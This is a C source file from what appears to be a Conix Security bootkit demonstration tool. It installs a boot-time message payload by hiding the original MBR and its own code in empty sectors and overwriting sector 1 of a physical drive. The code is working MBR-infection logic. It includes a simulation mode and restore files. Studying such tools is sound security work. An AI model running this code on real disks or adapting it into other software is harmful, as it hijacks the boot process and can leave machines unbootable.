// Copyright 2013 Conix Security, Adrien Chevalier
// adrien.chevalier@conix.fr
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.
#include "bootkit_tool.h"

//////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Description :
//		Generate ASCII art display code from file content.
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
DWORD generate_bootkit_code_from_template(char* bootkit_template_path, PBYTE bootkit_code, PDWORD dwSize, DWORD original_mbr_sector)
{
	BYTE bootkitStart[0x03] = {
		0xE9, 0x10, 0x06	// JMP 0000:0600 + message_size + display_routine_size
	};
	BYTE bootkitEnd[0x3D] = {
		// display routine
		0xAC, 0x3C, 0x00,
		0x74, 0x06,
		0xB4, 0x0E,
		0xCD, 0x10,
		0xEB, 0xF5,
		0xC3,
		// entry point
		0xB4, 0x00,			// set display size
		0xB0, 0x12,
		0xCD, 0x10,
		0xB3, 0x0E,			// display message (yellow)
		0xBE, 0x03, 0x06,
		0xE8, 0xE6, 0xFF,
		0xB4, 0x00,
		0xCD, 0x16,			// wait for input
		// load original MBR
		0xB0, 0x01,
		0xB5, 0x00,			// cylinder n°
		0xB1, 0x02,			// sector n°
		0xB6, 0x00,			// track n°
		0xB2, 0x80,
		0xBB, 0x00, 0x00,
		0x8E, 0xC3,
		0xBB, 0x00, 0x7C,
		0xB4, 0x02,
		0xCD, 0x13,			// load sector at 0000:7C00
		0xBB, 0x00, 0x00,
		0x53,
		0xBB, 0x00, 0x7C,
		0x53,
		0xCB
	};
	HANDLE hFile;
	DWORD neededSize=0;
	LARGE_INTEGER fileSize;
	PBYTE buffer;
	DWORD len;
	BYTE cylinderNb, trackNb, sectorNb;

	hFile = CreateFileA(bootkit_template_path,GENERIC_READ,0,NULL,OPEN_EXISTING,0,NULL);
	if(hFile == INVALID_HANDLE_VALUE || hFile == NULL)
	{
		printf("[!] Can't open %s\n",bootkit_template_path);
		return -1;
	}

	if(!GetFileSizeEx(hFile,&fileSize))
	{
		CloseHandle(hFile);
		printf("[!] Can't open %s\n",bootkit_template_path);
		return -1;
	}
	if(fileSize.HighPart != 0 || fileSize.LowPart > 0x2400)
	{
		CloseHandle(hFile);
		printf("[!] Can't open %s (file too large).\n",bootkit_template_path);
		return -1;
	}

	*dwSize = 0x40+fileSize.LowPart;
	if(bootkit_code == NULL)
	{
		CloseHandle(hFile);
		return 0;
	}

	if(*dwSize < fileSize.LowPart+0x40)
		return -1;

	buffer = (PBYTE)malloc(fileSize.LowPart +1);
	if(!ReadFile(hFile,buffer,fileSize.LowPart,&len,NULL))
	{
		CloseHandle(hFile);
		free(buffer);
		printf("[!] Can't read %s.\n",bootkit_template_path);
		return -1;
	}
	buffer[fileSize.LowPart]=0x00;

	memcpy(bootkit_code,bootkitStart,BOOTKIT_START_SIZE);						// first bytes
	*((PWORD)(bootkit_code+1)) = ((WORD)(fileSize.LowPart) + 1 + BOOTKIT_SKIP_SIZE);		// patch first JMP instruction
	memcpy(bootkit_code+BOOTKIT_START_SIZE,buffer,fileSize.LowPart+1);				// copy message
	memcpy(bootkit_code+BOOTKIT_START_SIZE+fileSize.LowPart+1,bootkitEnd,BOOTKIT_END_SIZE);		// copy end

	// patch track / cylinder / sector
	// no data loss while casting (all BYTE)
	sectorNb = original_mbr_sector % sectors_per_track;
	if(sectorNb == 0)
		sectorNb ++;
	trackNb = original_mbr_sector / sectors_per_track;
	cylinderNb = trackNb / tracks_per_cylinder;
	trackNb = trackNb % tracks_per_cylinder;
	
	bootkit_code[*dwSize - 0x17] = trackNb;
	bootkit_code[*dwSize - 0x19] = sectorNb;
	bootkit_code[*dwSize - 0x1B] = cylinderNb;

	free(buffer);
	CloseHandle(hFile);
	return 0;

}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Description :
//		Installs ASCII art payload which displays message contained into the "bootkit_template_path"
//	file at boot along with MBR (loads and exec. ASCII art payload).
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
DWORD write_ascii_art_mbr(char* device, BOOL simulation, char* bootkit_template_path)
{
	BYTE bootloader[0x28] = {
		0x8C, 0xC8,
		0x8E, 0xD8,
		0x8E, 0xD0,
		0xBC, 0x00, 0x7C,
		// load sector(s)
		0xB0, 0x01,			// sectors count
		0xB5, 0x00,			// cylinder n°
		0xB1, 0x03,			// sector n°
		0xB6, 0x00,			// track n°
		0xB2, 0x80,
		0xBB, 0x00, 0x00,
		0x8E, 0xC3,
		0xBB, 0x00, 0x06,
		0xB4, 0x02,
		0xCD, 0x13,
		// jmp 0000:0600
		0xBB, 0x00, 0x00,
		0x53,
		0xBB, 0x00, 0x06,
		0x53,
		0xCB
	};
	HANDLE hPD, hSaved;
	PBYTE originalMbr, bufftemp;
	DWORD len;
	BOOL sector_empty;
	PBYTE bootkitCode, bootloaderCode;
	DWORD nb_required_sectors;
	DWORD bootkitSize;
	DWORD max_sectors_code_cave;
	DWORD code_cave_start_sector_number=0;
	DWORD cpt_sectors = 0;
	DWORD begin, size;
	DWORD i=0, j=0;
	BYTE sectorNb, trackNb, cylinderNb;

// bootkit size ?
	if(generate_bootkit_code_from_template(bootkit_template_path,NULL,&bootkitSize,0)==-1)
		return -1;

	// required sectors
	nb_required_sectors = bootkitSize / bytes_per_sector;
	if(bootkitSize % bytes_per_sector != 0)
		nb_required_sectors++;

	if(simulation)
		printf("[d] Bootkit size : 0x%x bytes (%d sectors)\n",bootkitSize, nb_required_sectors);

// read MBR and partition table (sector #1)
	hPD = CreateFileA(device,GENERIC_READ,0,NULL,OPEN_EXISTING,0,NULL);
	if(hPD == INVALID_HANDLE_VALUE || hPD == NULL)
	{
		printf("[!] Can't open %s\n",device);
		return -1;
	}

	printf("[-] Reading original MBR + partition table\n");
	originalMbr=(PBYTE)malloc(bytes_per_sector);
	if(!ReadFile(hPD, originalMbr, bytes_per_sector, &len, NULL))
	{
		printf("[!] Can't read PhysicalDrive0 sector #1\n");
		free(originalMbr);
		CloseHandle(hPD);
		return -1;
	}

	max_sectors_code_cave = get_first_sector_offset_from_first_sector(originalMbr);

	if(simulation)
		printf("\t[D] Code-cave sectors end at sector 0x%d (Addr 0x%.8x)\n",max_sectors_code_cave,max_sectors_code_cave*bytes_per_sector);

// check if there are enough "code cave" sectors to copy the bootkit code + saved MBR code
	bufftemp=(PBYTE)malloc(bytes_per_sector);
	for(i = 1; i<max_sectors_code_cave; i++)
	{
		if(SetFilePointer(hPD, bytes_per_sector*i,NULL,FILE_BEGIN) != bytes_per_sector*i)
		{
			free(originalMbr);
			free(bufftemp);
			CloseHandle(hPD);
			printf("[!] Can't go to offset 0x%x\n",i*bytes_per_sector);
			return -1;
		}
		if(!ReadFile(hPD, bufftemp, bytes_per_sector, &len, NULL))
		{
			free(originalMbr);
			free(bufftemp);
			CloseHandle(hPD);
			printf("[!] Can't read offset 0x%x\n",i*bytes_per_sector);
			return -1;
		}

		sector_empty = TRUE;
		for(j=0;j<bytes_per_sector;j++)
		{
			if(bufftemp[j]!=0x0)
			{
				sector_empty = FALSE;
				break;
			}
		}

		if(sector_empty)
		{
			cpt_sectors++;
			if(code_cave_start_sector_number == 0)
				code_cave_start_sector_number = i;

			if(nb_required_sectors+1 == cpt_sectors)
				break;
		}
		else
		{
			cpt_sectors = 0;
			code_cave_start_sector_number = 0;
		}
	}
	free(bufftemp);
	CloseHandle(hPD);

	if(cpt_sectors != nb_required_sectors+1)
	{
		printf("[!] Not enough code cave sectors, aborting.\n");
		free(originalMbr);
		return -1;
	}

	// identify track / cylinder / sector (no data loss, all BYTE)
	sectorNb = (code_cave_start_sector_number+1+1) % sectors_per_track;
	if(sectorNb == 0)
		sectorNb ++;
	trackNb = (code_cave_start_sector_number+1+1) / sectors_per_track;
	cylinderNb = trackNb / tracks_per_cylinder;
	trackNb = trackNb % tracks_per_cylinder;

	if(simulation)
		printf("\t[D] Found code cave at sector #%d (addr : 0x%.8x ; bootkit CTS : %d/%d/%d)\n",
			code_cave_start_sector_number+1,
			code_cave_start_sector_number*bytes_per_sector,
			cylinderNb,
			trackNb,
			sectorNb);

// Save original MBR + partition table for manual restore purpose
	hSaved = CreateFileA("1st_sector.mbr",GENERIC_WRITE,0,NULL,OPEN_ALWAYS,0,NULL);
	printf("[-] Saving original MBR code to \"1st_sector.mbr\".\n");
	if(hSaved == NULL || hSaved == INVALID_HANDLE_VALUE)
	{
		free(originalMbr);
		printf("[!] Can't save the original MBR code.\n");
		return -1;
	}
	if(!WriteFile(hSaved,originalMbr,bytes_per_sector,&len,NULL))
	{
		free(originalMbr);
		CloseHandle(hSaved);
		printf("[!] Can't save the original MBR code.\n");
		return -1;
	}
	CloseHandle(hSaved);

// save information for automatic restore
	hSaved = CreateFileA("restore_point.bin",GENERIC_WRITE,0,NULL,OPEN_ALWAYS,0,NULL);
	printf("[-] Saving restore information to \"restore_point.bin\".\n");
	if(hSaved == NULL || hSaved == INVALID_HANDLE_VALUE)
	{
		free(originalMbr);
		printf("[!] Can't save data.\n");
		return -1;
	}
	begin = (code_cave_start_sector_number)*bytes_per_sector;
	size = (nb_required_sectors+1)*bytes_per_sector;
	if(!WriteFile(hSaved,&begin, 4,&len,NULL))
	{
		free(originalMbr);
		CloseHandle(hSaved);
		printf("[!] Can't save data.\n");
		return -1;
	}
	if(!WriteFile(hSaved,&size, 4,&len,NULL))
	{
		free(originalMbr);
		CloseHandle(hSaved);
		printf("[!] Can't save data.\n");
		return -1;
	}
	if(!WriteFile(hSaved,originalMbr,bytes_per_sector,&len,NULL))
	{
		free(originalMbr);
		CloseHandle(hSaved);
		printf("[!] Can't save data.\n");
		return -1;
	}
	CloseHandle(hSaved);


// Copy the MBR original code on sector #code_cave_start_sector_number+1
	hPD = CreateFileA(device,GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);
	if(hPD == NULL || hPD == INVALID_HANDLE_VALUE)
	{
		free(originalMbr);
		printf("[!] Can't open PhysicalDrive0 (write)\n");
		return -1;
	}
	
	printf("[-] Writing original MBR on sector #%d\n",code_cave_start_sector_number+1);
	if(!simulation)
	{
		if(SetFilePointer(hPD,code_cave_start_sector_number*bytes_per_sector,NULL,FILE_BEGIN) != code_cave_start_sector_number*bytes_per_sector)
		{
			free(originalMbr);
			CloseHandle(hPD);
			printf("[!] Can't go to offset 0x%x\n",code_cave_start_sector_number*bytes_per_sector);
			return -1;
		}
		if(!WriteFile(hPD,originalMbr,bytes_per_sector,&len,NULL))
		{
			free(originalMbr);
			CloseHandle(hPD);
			printf("[!] Can't write 0x%x bytes at offset 0x%x\n",bytes_per_sector,code_cave_start_sector_number*bytes_per_sector);
			return -1;
		}
	}

	bootkitCode = (PBYTE)malloc(nb_required_sectors * bytes_per_sector);
	memset(bootkitCode, 0, nb_required_sectors*bytes_per_sector);
	bootkitSize = nb_required_sectors * bytes_per_sector;
	if(generate_bootkit_code_from_template(bootkit_template_path,bootkitCode,&bootkitSize,code_cave_start_sector_number+1)==-1)
	{
		free(originalMbr);
		free(bootkitCode);
		CloseHandle(hPD);
		printf("[!] Can't generate bootkit code.\n");
		return -1;
	}


// copy the bootkit code on sector #code_cave_start_sector_number..#n
	if(simulation)
	{
		printf(  "\n\t\t[=== BOOTKIT CODE ===]\n");
		for(i=0; i<bytes_per_sector*nb_required_sectors; i++)
		{
			if(i % 0x10 == 0)
				printf("\n%.8x\t",i+0x600);
			
			printf("%.2x ",bootkitCode[i]);
		}
		printf("\n\n\t\t[=====================]\n\n");
	}

	for(i = 0; i < nb_required_sectors; i++)
	{
		printf("[-] Writing bootkit on sector #%d\n",i+code_cave_start_sector_number+1+1);
		if(!simulation)
		{
			if(SetFilePointer(hPD,(code_cave_start_sector_number+1+i)*bytes_per_sector,NULL,FILE_BEGIN) != (code_cave_start_sector_number+1+i)*bytes_per_sector)
			{
				free(originalMbr);
				CloseHandle(hPD);
				printf("[!] Can't go to offset 0x%x\n",(code_cave_start_sector_number+1+i)*bytes_per_sector);
				return -1;
			}
			if(!WriteFile(hPD,(PVOID)((DWORD)bootkitCode+(i*bytes_per_sector)),bytes_per_sector,&len,NULL))
			{
				free(originalMbr);
				CloseHandle(hPD);
				printf("[!] Can't write 0x%x bytes at sector #%d. You SHOULD restore old MBR...\n",bytes_per_sector,i+code_cave_start_sector_number+1);
				return -1;
			}
		}
	}
	

// generate bootloader code
	bootloaderCode = (PBYTE)malloc(bytes_per_sector);
	memset(bootloaderCode, 0, bytes_per_sector);
	memcpy(bootloaderCode, bootloader, BOOTLOADER_SIZE);
	// "startup" code
	bootloaderCode[0x0a] = (BYTE)nb_required_sectors;
	bootloaderCode[0x0c] = cylinderNb;
	bootloaderCode[0x10] = trackNb;
	bootloaderCode[0x0e] = sectorNb;
	// system ID + partition table + magic number
	memcpy((PVOID)((DWORD)bootloaderCode+0x1b8),(PVOID)((DWORD)originalMbr+0x1b8),0x48);


// write bootloader on sector #1
	printf("[-] Writing bootloader on sector #1\n");
	if(!simulation)
	{
		if(SetFilePointer(hPD,0,NULL,FILE_BEGIN) != 0)
		{
			free(bootloaderCode);
			free(originalMbr);
			CloseHandle(hPD);
			printf("[!] Can't go to offset 0x0\n");
			return -1;
		}
		if(!WriteFile(hPD,bootloaderCode,bytes_per_sector,&len,NULL))
		{
			free(bootloaderCode);
			free(originalMbr);
			CloseHandle(hPD);
			printf("[!] Can't write 0x%x bytes at offset 0x0\n",bytes_per_sector);
			return -1;
		}
	}
	else
	{
		printf(  "\n\t\t[== BOOTLOADER CODE ==]\n");
		for(i=0; i<bytes_per_sector; i++)
		{
			if(i % 0x10 == 0)
				printf("\n%.8x\t",i+0x7c00);
			
			printf("%.2x ",bootloaderCode[i]);
		}
		printf("\n\n\t\t[=====================]\n\n");
	}

	printf("[-] Finished\n");
	free(bootloaderCode);
	free(originalMbr);
	CloseHandle(hPD);
	return 0;
}
